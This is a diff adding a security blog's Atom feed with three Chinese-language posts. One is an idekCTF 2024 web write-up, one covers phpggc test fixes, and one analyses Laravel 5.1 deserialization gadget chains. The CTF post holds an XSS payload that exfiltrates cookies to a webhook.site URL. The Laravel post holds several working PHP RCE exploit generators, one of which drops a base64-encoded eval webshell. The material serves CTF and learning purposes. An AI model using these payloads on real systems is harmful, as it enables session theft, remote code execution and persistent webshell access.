@@ -1,0 +1,4349 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://fallingskies22.github.io</id>
+    <title>fallingskies</title>
+    <updated>2024-08-20T10:45:10.398Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://fallingskies22.github.io"/>
+    <link rel="self" href="https://fallingskies22.github.io/atom.xml"/>
+    <subtitle>&lt;h3&gt;想要去月球&lt;h3&gt;</subtitle>
+    <logo>https://fallingskies22.github.io/images/avatar.png</logo>
+    <icon>https://fallingskies22.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, fallingskies</rights>
+    <entry>
+        <title type="html"><![CDATA[idekCTF 2024 - Web]]></title>
+        <id>https://fallingskies22.github.io/post/idekctf-2024-web/</id>
+        <link href="https://fallingskies22.github.io/post/idekctf-2024-web/">
+        </link>
+        <updated>2024-08-19T16:34:34.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="hello">hello</h2>
+<p>绕过空格过滤</p>
+<pre><code>%09 /t 水平定位符号即tab
+%0a /n 换行键
+%0c 换页符
+%0d /r CR(字符)
+</code></pre>
+<pre><code>&lt;img%0Csrc=1%0Conerror=eval(String.fromCharCode())%0c&gt;
+</code></pre>
+<p>Cookie设置了httponly，不能用document.cookie获取<br>
+考虑使用phpinfo页面来提取cookie信息。</p>
+<p>但是info.php只允许本地访问。</p>
+<p>根据nginx配置文件</p>
+<pre><code class="language-nginx">user www-data;
+worker_processes  1;
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    include       /etc/nginx/mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+
+        location / {
+            root   /usr/share/nginx/html;
+            index  index.php index.html index.htm;
+        }
+
+        location = /info.php {
+        allow 127.0.0.1;
+        deny all;
+        }
+
+        location ~ \.php$ {
+        root           /usr/share/nginx/html;
+        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
+        include fastcgi_params;  
+        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
+        }
+
+    }
+}
+</code></pre>
+<p>使用<code>info.php/index.php</code>来绕过限制<br>
+参考<a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration">文章</a><br>
+在php中会无视第二个php文件，指向第一个php文件。<br>
+同时这个路径又会绕过nginx的校验。</p>
+<p>使用XMLHttpRequest如下格式</p>
+<pre><code>var req = new XMLHttpRequest();
+req.onload = reqListener;
+var url = 'http://idek-hello.chal.idek.team:1337/info.php';
+req.withCredentials = true;
+req.open('GET', url, false);
+req.send();
+
+function reqListener() {
+var req2 = new XMLHttpRequest();
+const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
+req2.open('GET', 'https://webhook.site/20962f32-4225-456a-83fb-769d5c10a23d/?data=' + btoa(sess), false);
+req2.send()
+};
+</code></pre>
+<p>使用cyberchef进行编码</p>
+<pre><code>http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc=1%0Conerror=eval(String.fromCharCode(0x76,0x61,.....))%3E
+</code></pre>
+<p>使用fetch</p>
+<pre><code>fetch(&quot;/info.php/index.php&quot;).then(response =&gt; response.text()).then(data =&gt; fetch(&quot;https://webhook.site/20962f32-4225-456a-83fb-769d5c10a23d/?data=&quot;+btoa(data.substring(data.indexOf(&quot;HTTP_COOKIE&quot;),data.indexOf(&quot;HTTP_COOKIE&quot;)+100)))
+</code></pre>
+<p>payload</p>
+<pre><code>&lt;svg%0Conload=eval(atob(&quot;ZmV0Y2goIi9pbmZvLnBocC9pbmRleC5waHAiKS50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0%2BIGZldGNoKCJodHRwczovL3dlYmhvb2suc2l0ZS8yMDk2MmYzMi00MjI1LTQ1NmEtODNmYi03NjlkNWMxMGEyM2QvP2RhdGE9IitidG9hKGRhdGEuc3Vic3RyaW5nKGRhdGEuaW5kZXhPZigiSFRUUF9DT09LSUUiKSxkYXRhLmluZGV4T2YoIkhUVFBfQ09PS0lFIikrMTAwKSkpKQ%3D%3D&quot;))&gt;
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[phpgc修改test-gc-compatibility.py]]></title>
+        <id>https://fallingskies22.github.io/post/phpgc-xiu-gai-test-gc-compatibilitypy/</id>
+        <link href="https://fallingskies22.github.io/post/phpgc-xiu-gai-test-gc-compatibilitypy/">
+        </link>
+        <updated>2024-08-19T05:19:20.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>在本地跑起来一堆问题。</p>
+<h2 id="过程">过程</h2>
+<p>设置环境变量</p>
+<pre><code>COMPOSER_PATH=C:\Users\24217\AppData\Local\ComposerSetup\bin\composer.phar
+</code></pre>
+<p>PHP环境变量一般安装都自带了。</p>
+<p>添加异常处理，不然运行会直接oserror退出了</p>
+<pre><code class="language-python">        try:
+            if self._try_run_command(php_file):
+                return (php_file,)
+        except OSError:
+            if path.exists() and self._try_run_command(self._php_path, php_file):
+                return (self._php_path, php_file)
+        
+</code></pre>
+<p>这里可以加一个print，方便调试。</p>
+<pre><code class="language-python">    def _run(self, *args):
+        &quot;&quot;&quot;Runs a program with given arguments.&quot;&quot;&quot;
+        print(&quot;this is args:&quot;)
+        print(args)
+        return subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+</code></pre>
+<p><code>test_payload.php</code>,给第一个参数<code>PHP_BINARY</code>加一下引号，不然路径中如果有空格会报错。</p>
+<pre><code class="language-php">$output = shell_exec(
+            '&quot;'.PHP_BINARY.'&quot;' . ' ' .
+            escapeshellarg(DIR_LIB . '/test_payload.php') . ' ' .
+            escapeshellarg($vector) . ' ' .
+            escapeshellarg(base64_encode($payload))
+        );
+</code></pre>
+<p>测试时，有时候，包下载不下来，难搞。</p>
+<p>使用monolog测试就可以正常</p>
+<pre><code class="language-sh">&amp; &quot;D:/Program Files (x86)/Python/python.exe&quot; d:/git_proj/phpggc/test-gc-compatibility.py monolog/monolog:2.3.0 monolog/rce1 monolog/rce3
+</code></pre>
+<p>但是使用laravel时，package就显示KO，。。。</p>
+<pre><code class="language-sh">&amp; &quot;D:/Program Files (x86)/Python/python.exe&quot; d:/git_proj/phpggc/test-gc-compatibility.py laravel/laravel:5.4.0 Laravel/RCE9
+</code></pre>
+<p>感觉本地环境有点不太好弄，项目也提供有docker，用docker试试。</p>
+<p>docker安装也有问题，靠，不搞了🙁</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Laravel5.1]反序列化链分析]]></title>
+        <id>https://fallingskies22.github.io/post/laravel51fan-xu-lie-hua-lian-fen-xi/</id>
+        <link href="https://fallingskies22.github.io/post/laravel51fan-xu-lie-hua-lian-fen-xi/">
+        </link>
+        <updated>2024-08-18T10:10:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="环境搭建">环境搭建</h2>
+<p>下载源码地址：https://github.com/laravel/laravel/releases/tag/v5.1.0</p>
+<p>github上的源码会缺少vender目录</p>
+<p>使用composer下载后，将vender目录拷贝到源码中</p>
+<pre><code class="language-sh">composer create-project --prefer-dist laravel/laravel laravel5.1 &quot;5.1.*&quot;
+</code></pre>
+<p>PHP版本：<code>7.3.22</code></p>
+<p>将<code>.env.example</code>中内容复制到新建的<code>.env</code>中<br>
+设置<code>APP_ENV=local</code></p>
+<p>这样页面会显示报错信息。</p>
+<p>修改ini文件，打开openssl extension</p>
+<pre><code>extension_dir = &quot;ext&quot;
+extension=openssl
+</code></pre>
+<h2 id="入口处">入口处</h2>
+<p>使用<code>app/Http/routes.php</code>编写入口</p>
+<pre><code class="language-php">&lt;?php
+Route::get('admin/{obj}',function($s){
+    if($s){
+        unserialize(base64_decode($s));
+        return 'unserialize done'.$s;
+    }else{
+        return 'unserialize error'.$s;
+    }
+});
+</code></pre>
+<h2 id="rce1分析">RCE1分析</h2>
+<p>先全局搜索<code>function __destruct()</code><br>
+找到<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</code></p>
+<pre><code class="language-php">&lt;?php
+public function __destruct()
+    {
+        foreach ($this-&gt;_keys as $nsKey =&gt; $null) {
+            $this-&gt;clearAll($nsKey);
+        }
+    }
+</code></pre>
+<p>每次迭代中，<code>$nsKey</code>变量会被赋值为<code>$this-&gt;_keys</code>的键，而<code>$null</code>变量在这个上下文中实际上是未使用的。</p>
+<p>继续跟进<code>clearAll()</code>函数，<code>is_file()</code>和<code>is_dir()</code>函数都会将参数当作string进行拼接处理，因为<code>$this-&gt;_path</code>可控，可以触发其他类的<code>__toString()</code>方法</p>
+<p>这里的<code>$this-&gt;_keys</code>是一个二重数组，如下所示</p>
+<pre><code>[1,[1,1]],[2,[2,2]],...
+</code></pre>
+<p>这里因为会使用<code>unlink</code>删除文件，在构造_keys的内容时，写特殊一点，以防删掉服务器文件。</p>
+<pre><code class="language-php">&lt;?php
+    /**
+     * Check if the given $itemKey exists in the namespace $nsKey.
+     *
+     * @param string $nsKey
+     * @param string $itemKey
+     *
+     * @return bool
+     */
+    public function hasKey($nsKey, $itemKey)
+    {
+        return is_file($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
+    }
+
+    /**
+     * Clear data for $itemKey in the namespace $nsKey if it exists.
+     *
+     * @param string $nsKey
+     * @param string $itemKey
+     */
+    public function clearKey($nsKey, $itemKey)
+    {
+        if ($this-&gt;hasKey($nsKey, $itemKey)) {
+            $this-&gt;_freeHandle($nsKey, $itemKey);
+            unlink($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
+        }
+    }
+    /**
+     * Clear all data in the namespace $nsKey if it exists.
+     *
+     * @param string $nsKey
+     */
+    public function clearAll($nsKey)
+    {
+        if (array_key_exists($nsKey, $this-&gt;_keys)) {
+            foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) {
+                $this-&gt;clearKey($nsKey, $itemKey);
+            }
+            if (is_dir($this-&gt;_path.'/'.$nsKey)) {
+                rmdir($this-&gt;_path.'/'.$nsKey);
+            }
+            unset($this-&gt;_keys[$nsKey]);
+        }
+    }
+</code></pre>
+<p>下一步寻找可利用<code>__toString()</code>函数的类</p>
+<p>这里可以选择<code>vendor/mockery/mockery/library/Mockery/Generator/DefinedTargetClass.php</code>中的<code>__toString()</code>方法作为触发的点，其先会调用<code>getName()</code>方法，且该方法中的<code>$this-&gt;rfc</code>是可控的，因此可以来触发一个没有<code>getName()</code>方法的类从而来触发该类中的<code>__call()</code>方法</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Mockery\Generator;
+
+class DefinedTargetClass
+{
+    private $rfc;
+
+    public function __construct(\ReflectionClass $rfc)
+    {
+        $this-&gt;rfc = $rfc;
+    }
+...
+    public function getName()
+    {
+        return $this-&gt;rfc-&gt;getName();
+    }
+...
+    public function __toString()
+    {
+        return $this-&gt;getName();
+    }
+...
+</code></pre>
+<p>全局搜索<code>__call()</code>方法,跟进<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>中的<code>__call()</code>方法，其 while 语句内的<code>$this-&gt;validator</code>是可控的，当<code>$res</code>能够是命令执行函数的参数时即可触发命令执行 RCE，由于<code>$this-&gt;generator</code>也是可控的，因此可以寻找一个能够有返回参数值的方法类来达到返回命令执行函数参数的目的从而 RCE</p>
+<p><code>call_user_func()</code>函数只会返回<code>NULL</code>,所以会一直循环。设置<code>$this-&gt;maxRetries</code>来限制循环次数。</p>
+<p><a href="https://www.php.net/manual/en/function.call-user-func-array.php"><code>call_user_func_array()</code>函数使用参考</a></p>
+<pre><code class="language-php">&lt;?php
+    /**
+     * Catch and proxy all generator calls with arguments but return only valid values
+     * @param string $name
+     * @param array $arguments
+     *
+     * @return mixed
+     */
+    public function __call($name, $arguments)
+    {
+        $i = 0;
+        do {
+            $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
+            $i++;
+            if ($i &gt; $this-&gt;maxRetries) {
+                throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
+            }
+        } while (!call_user_func($this-&gt;validator, $res));
+
+        return $res;
+    }
+</code></pre>
+<p>这里可以用<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>来做触发点，当前面设置的<code>$name</code>方法不存在时这里就会触发到<code>__call()</code>方法，从而返回可控参数<code>$this-&gt;default</code>的值，这样就可以控制<code>$res</code>参数了。</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Faker;
+
+/**
+ * This generator returns a default value for all called properties
+ * and methods. It works with Faker\Generator\Base-&gt;optional().
+ */
+class DefaultGenerator
+{
+    protected $default;
+
+    public function __construct($default = null)
+    {
+        $this-&gt;default = $default;
+    }
+
+    /**
+     * @param string $attribute
+     *
+     * @return mixed
+     */
+    public function __get($attribute)
+    {
+        return $this-&gt;default;
+    }
+
+    /**
+     * @param string $method
+     * @param array $attributes
+     *
+     * @return mixed
+     */
+    public function __call($method, $attributes)
+    {
+        return $this-&gt;default;
+    }
+}
+</code></pre>
+<h2 id="exp">exp</h2>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace Mockery\Generator{
+    use Faker\ValidGenerator;
+    class DefinedTargetClass
+    {
+        private $rfc;
+        public function __construct($cmd)
+        {
+            $this-&gt;rfc=new ValidGenerator($cmd);
+        }
+    }
+}
+
+namespace{
+    use Mockery\Generator\DefinedTargetClass;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new DefinedTargetClass($cmd);
+        }
+    }
+    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
+}
+?&gt;
+</code></pre>
+<h2 id="__tostring处其他函数利用">__toString处其他函数利用</h2>
+<p>寻找其他可利用的<code>__toString()</code>函数</p>
+<p>IdenticalValueToken.php<br>
+ExactValueToken.php<br>
+中貌似可以利用</p>
+<p>主要找有两个<code>-&gt;</code>的地方，能够跳到下一段<code>_call</code>代码处。</p>
+<p>这里用<br>
+<code>vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p>
+<pre><code class="language-php">&lt;?php
+public function __toString() : string
+    {
+        if ($this-&gt;description) {
+            $description = $this-&gt;description-&gt;render();
+        } else {
+            $description = '';
+        }
+
+        $version = (string) $this-&gt;version;
+
+        return $version . ($description !== '' ? ($version !== '' ? ' ' : '') . $description : '');
+    }
+</code></pre>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace phpDocumentor\Reflection\DocBlock\Tags{
+    use Faker\ValidGenerator;
+    class Deprecated
+    {
+        protected $description;
+        public function __construct($cmd)
+        {
+            $this-&gt;description=new ValidGenerator($cmd);
+        }
+    }
+}
+
+namespace{
+    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new DefinedTargetClass($cmd);
+        }
+    }
+    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
+}
+?&gt;
+</code></pre>
+<h2 id="__call处其他函数利用">__call处其他函数利用</h2>
+<p>找到<code>vendor/laravel/framework/src/Illuminate/Database/DatabaseManager.php</code><br>
+跟进<code>__call()</code>方法，其调用了<code>connection()</code>方法，跟进去，这里要让其进入<code>makeConnection()</code>方法从而来利用<code>call_user_func()</code>方法来进行RCE</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Illuminate\Database;
+
+use Illuminate\Support\Arr;
+use Illuminate\Support\Str;
+use InvalidArgumentException;
+use Illuminate\Database\Connectors\ConnectionFactory;
+
+class DatabaseManager implements ConnectionResolverInterface
+{
+    /**
+     * The application instance.
+     *
+     * @var \Illuminate\Foundation\Application
+     */
+    protected $app;
+
+    /**
+     * The database connection factory instance.
+     *
+     * @var \Illuminate\Database\Connectors\ConnectionFactory
+     */
+    protected $factory;
+
+    /**
+     * The active connection instances.
+     *
+     * @var array
+     */
+    protected $connections = [];
+
+    /**
+     * The custom connection resolvers.
+     *
+     * @var array
+     */
+    protected $extensions = [];
+
+    /**
+     * Create a new database manager instance.
+     *
+     * @param  \Illuminate\Foundation\Application  $app
+     * @param  \Illuminate\Database\Connectors\ConnectionFactory  $factory
+     * @return void
+     */
+    public function __construct($app, ConnectionFactory $factory)
+    {
+        $this-&gt;app = $app;
+        $this-&gt;factory = $factory;
+    }
+
+    /**
+     * Get a database connection instance.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    public function connection($name = null)
+    {
+        list($name, $type) = $this-&gt;parseConnectionName($name);
+
+        // If we haven't created this connection, we'll create it based on the config
+        // provided in the application. Once we've created the connections we will
+        // set the &quot;fetch mode&quot; for PDO which determines the query return types.
+        if (! isset($this-&gt;connections[$name])) {
+            $connection = $this-&gt;makeConnection($name);
+
+            $this-&gt;setPdoForType($connection, $type);
+
+            $this-&gt;connections[$name] = $this-&gt;prepare($connection);
+        }
+
+        return $this-&gt;connections[$name];
+    }
+
+    /**
+     * Parse the connection into an array of the name and read / write type.
+     *
+     * @param  string  $name
+     * @return array
+     */
+    protected function parseConnectionName($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        return Str::endsWith($name, ['::read', '::write'])
+                            ? explode('::', $name, 2) : [$name, null];
+    }
+
+    /**
+     * Disconnect from the given database and remove from local cache.
+     *
+     * @param  string  $name
+     * @return void
+     */
+    public function purge($name = null)
+    {
+        $this-&gt;disconnect($name);
+
+        unset($this-&gt;connections[$name]);
+    }
+
+    /**
+     * Disconnect from the given database.
+     *
+     * @param  string  $name
+     * @return void
+     */
+    public function disconnect($name = null)
+    {
+        if (isset($this-&gt;connections[$name = $name ?: $this-&gt;getDefaultConnection()])) {
+            $this-&gt;connections[$name]-&gt;disconnect();
+        }
+    }
+
+    /**
+     * Reconnect to the given database.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    public function reconnect($name = null)
+    {
+        $this-&gt;disconnect($name = $name ?: $this-&gt;getDefaultConnection());
+
+        if (! isset($this-&gt;connections[$name])) {
+            return $this-&gt;connection($name);
+        }
+
+        return $this-&gt;refreshPdoConnections($name);
+    }
+
+    /**
+     * Refresh the PDO connections on a given connection.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    protected function refreshPdoConnections($name)
+    {
+        $fresh = $this-&gt;makeConnection($name);
+
+        return $this-&gt;connections[$name]
+                                -&gt;setPdo($fresh-&gt;getPdo())
+                                -&gt;setReadPdo($fresh-&gt;getReadPdo());
+    }
+
+    /**
+     * Make the database connection instance.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    protected function makeConnection($name)
+    {
+        $config = $this-&gt;getConfig($name);
+
+        // First we will check by the connection name to see if an extension has been
+        // registered specifically for that connection. If it has we will call the
+        // Closure and pass it the config allowing it to resolve the connection.
+        if (isset($this-&gt;extensions[$name])) {
+            return call_user_func($this-&gt;extensions[$name], $config, $name);
+        }
+
+        $driver = $config['driver'];
+
+        // Next we will check to see if an extension has been registered for a driver
+        // and will call the Closure if so, which allows us to have a more generic
+        // resolver for the drivers themselves which applies to all connections.
+        if (isset($this-&gt;extensions[$driver])) {
+            return call_user_func($this-&gt;extensions[$driver], $config, $name);
+        }
+
+        return $this-&gt;factory-&gt;make($config, $name);
+    }
+
+    /**
+     * Prepare the database connection instance.
+     *
+     * @param  \Illuminate\Database\Connection  $connection
+     * @return \Illuminate\Database\Connection
+     */
+    protected function prepare(Connection $connection)
+    {
+        $connection-&gt;setFetchMode($this-&gt;app['config']['database.fetch']);
+
+        if ($this-&gt;app-&gt;bound('events')) {
+            $connection-&gt;setEventDispatcher($this-&gt;app['events']);
+        }
+
+        // Here we'll set a reconnector callback. This reconnector can be any callable
+        // so we will set a Closure to reconnect from this manager with the name of
+        // the connection, which will allow us to reconnect from the connections.
+        $connection-&gt;setReconnector(function ($connection) {
+            $this-&gt;reconnect($connection-&gt;getName());
+        });
+
+        return $connection;
+    }
+
+    /**
+     * Prepare the read write mode for database connection instance.
+     *
+     * @param  \Illuminate\Database\Connection  $connection
+     * @param  string  $type
+     * @return \Illuminate\Database\Connection
+     */
+    protected function setPdoForType(Connection $connection, $type = null)
+    {
+        if ($type == 'read') {
+            $connection-&gt;setPdo($connection-&gt;getReadPdo());
+        } elseif ($type == 'write') {
+            $connection-&gt;setReadPdo($connection-&gt;getPdo());
+        }
+
+        return $connection;
+    }
+
+    /**
+     * Get the configuration for a connection.
+     *
+     * @param  string  $name
+     * @return array
+     *
+     * @throws \InvalidArgumentException
+     */
+    protected function getConfig($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        // To get the database connection configuration, we will just pull each of the
+        // connection configurations and get the configurations for the given name.
+        // If the configuration doesn't exist, we'll throw an exception and bail.
+        $connections = $this-&gt;app['config']['database.connections'];
+
+        if (is_null($config = Arr::get($connections, $name))) {
+            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
+        }
+
+        return $config;
+    }
+
+    /**
+     * Get the default connection name.
+     *
+     * @return string
+     */
+    public function getDefaultConnection()
+    {
+        return $this-&gt;app['config']['database.default'];
+    }
+
+    /**
+     * Set the default connection name.
+     *
+     * @param  string  $name
+     * @return void
+     */
+    public function setDefaultConnection($name)
+    {
+        $this-&gt;app['config']['database.default'] = $name;
+    }
+
+    /**
+     * Register an extension connection resolver.
+     *
+     * @param  string    $name
+     * @param  callable  $resolver
+     * @return void
+     */
+    public function extend($name, callable $resolver)
+    {
+        $this-&gt;extensions[$name] = $resolver;
+    }
+
+    /**
+     * Return all of the created connections.
+     *
+     * @return array
+     */
+    public function getConnections()
+    {
+        return $this-&gt;connections;
+    }
+
+    /**
+     * Dynamically pass methods to the default connection.
+     *
+     * @param  string  $method
+     * @param  array   $parameters
+     * @return mixed
+     */
+    public function __call($method, $parameters)
+    {
+        return call_user_func_array([$this-&gt;connection(), $method], $parameters);
+    }
+}
+</code></pre>
+<p>跟进<code>getConfig()</code>方法，继续跟进<code>Arr::get($connections, $name)</code>，可以看到经过<code>get()</code>方法返回回来的<code>$config</code>的值是可控的，可以将命令执行函数返回回来，从而导致 RCE</p>
+<p>需要将<code>$this-&gt;extensions[$name]</code>赋值为<code>call_user_func</code>，<code>$config</code>赋值为<code>system</code>,<code>$name</code>赋值为<code>id</code>(即$payload)</p>
+<p>往上查看<code>$name</code>参数传递过程</p>
+<pre><code>list($name, $type) = $this-&gt;parseConnectionName($name);
+</code></pre>
+<p>继续跟进<code>parseConnectionName()</code>函数</p>
+<pre><code>protected function parseConnectionName($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        return Str::endsWith($name, ['::read', '::write'])
+                            ? explode('::', $name, 2) : [$name, null];
+    }
+</code></pre>
+<p>继续跟进<code>getDefaultConnection()</code>函数</p>
+<pre><code>public function getDefaultConnection()
+    {
+        return $this-&gt;app['config']['database.default'];
+    }
+</code></pre>
+<p>可以看到直接赋值<code>$this-&gt;app['config']['database.default']=$payload</code>就可以了,上一个函数对<code>::</code>进行分割，所以设置参数时也可以加<code>::</code>,虽然没啥用😅</p>
+<p>继续看<code>$config</code>参数</p>
+<pre><code>$config = $this-&gt;getConfig($name);
+</code></pre>
+<p>跟进<code>getConfig()</code>函数</p>
+<pre><code>protected function getConfig($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        // To get the database connection configuration, we will just pull each of the
+        // connection configurations and get the configurations for the given name.
+        // If the configuration doesn't exist, we'll throw an exception and bail.
+        $connections = $this-&gt;app['config']['database.connections'];
+
+        if (is_null($config = Arr::get($connections, $name))) {
+            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
+        }
+
+        return $config;
+    }
+</code></pre>
+<p>继续跟进<code>Arr::get</code></p>
+<pre><code>public static function get($array, $key, $default = null)
+    {
+        if (is_null($key)) {
+            return $array;
+        }
+
+        if (isset($array[$key])) {
+            return $array[$key];
+        }
+        ...
+</code></pre>
+<p>因为<code>$name</code>已经被我们赋值了，所以设置<code>$this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system']</code><br>
+<code>$this-&gt;extensions[$payload]='call_user_func';</code><br>
+这样就构造完成了。</p>
+<h2 id="exp-3">exp</h2>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Database{
+    class DatabaseManager{
+        protected $app;
+        protected $extensions ;
+        public function __construct($payload)
+        {
+            $this-&gt;app['config']['database.default'] = $payload;
+            $this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system'];
+            $this-&gt;extensions[$payload]='call_user_func';
+        }
+    }
+}
+
+namespace phpDocumentor\Reflection\DocBlock\Tags{
+    use Illuminate\Database\DatabaseManager;
+    class Deprecated
+    {
+        protected $description;
+        public function __construct($payload)
+        {
+            $this-&gt;description=new DatabaseManager($payload);
+        }
+    }
+}
+
+namespace {
+    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
+    class Swift_KeyCache_DiskKeyCache {
+        private $_path;
+        private $_keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
+        public function __construct($payload) {
+            $this-&gt;_path = new Deprecated($payload);
+        }
+    }
+    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;echo 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='|base64 -d &gt; 1.php&quot;)));
+}
+?&gt;
+</code></pre>
+<p>命令执行成功后，会有报错信息<br>
+<img src="https://fallingskies22.github.io/post-images/1724071508888.png" alt="" loading="lazy"></p>
+<h2 id="另一条">另一条</h2>
+<p>分析就省略了，就是改了__tostring和__call<br>
+这里注意调用__call时是能带入参数的，这里</p>
+<pre><code>$method=stringfy
+$attributes=$this-&gt;value
+</code></pre>
+<pre><code class="language-php">&lt;?php 
+namespace Faker {
+    class Generator {
+        protected $formatters = array();
+        function __construct() {
+            $this-&gt;formatters = ['stringify' =&gt; &quot;system&quot;];
+        }
+    }
+}
+
+namespace Prophecy\Argument\Token {
+    use Faker\Generator;
+    class ExactValueToken {
+        private $string;
+        private $value;
+        private $util;
+        public function __construct($payload) {
+            $this-&gt;string = null;
+            $this-&gt;util = new Generator();;
+            $this-&gt;value = $payload;
+        }
+    }
+}
+
+namespace {
+    use Prophecy\Argument\Token\ExactValueToken;
+    class Swift_KeyCache_DiskKeyCache {
+        private $path;
+        private $keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
+        public function __construct($payload) {
+            $this-&gt;path = new ExactValueToken($payload);
+        }
+    }
+    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;)));
+}
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1724118558197.png" alt="" loading="lazy"></figure>
+<p>但是测试发现<code>Generator</code>中的<code>__call</code>利用不了，因为已经修复了<br>
+<code>$this-&gt;formatters</code>会清空，导致后面利用参数链断裂。</p>
+<pre><code>public function __wakeup()
+    {
+        $this-&gt;formatters = [];
+    }
+</code></pre>
+<h2 id="另另一条">另另一条</h2>
+<p><code>vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code></p>
+<pre><code>public function __call($method, $parameters)
+    {
+        $rule = Str::snake(substr($method, 8));
+        echo $rule;
+        if (isset($this-&gt;extensions[$rule])) {
+            return $this-&gt;callExtension($rule, $parameters);
+        }
+
+        throw new BadMethodCallException(&quot;Method [$method] does not exist.&quot;);
+    }
+</code></pre>
+<p>跟进<code>src/Illuminate/Validation/Validator.php</code>中的<code>__call()</code>方法，先进行字符串的操作截取<code>$method</code>第八个字符之后的字符，由于传入的字符串是<code>dispatch</code>，正好八个字符所以传入后为空，接着调用<code>callExtension()</code>方法，通过<code>instanceof Closure</code>判断，触发call_user_func_array方法<br>
+<img src="https://fallingskies22.github.io/post-images/1724126866932.png" alt="" loading="lazy"></p>
+<p>exp</p>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Validation {
+    class Validator {
+       public $extensions = [];
+       public function __construct() {
+            $this-&gt;extensions = ['' =&gt; 'system'];
+       }
+    }
+}
+
+namespace Illuminate\Broadcasting {
+    use  Illuminate\Validation\Validator;
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($cmd)
+        {
+            $this-&gt;events = new Validator();
+            $this-&gt;event = $cmd;
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast('calc')));
+}
+?&gt;
+</code></pre>
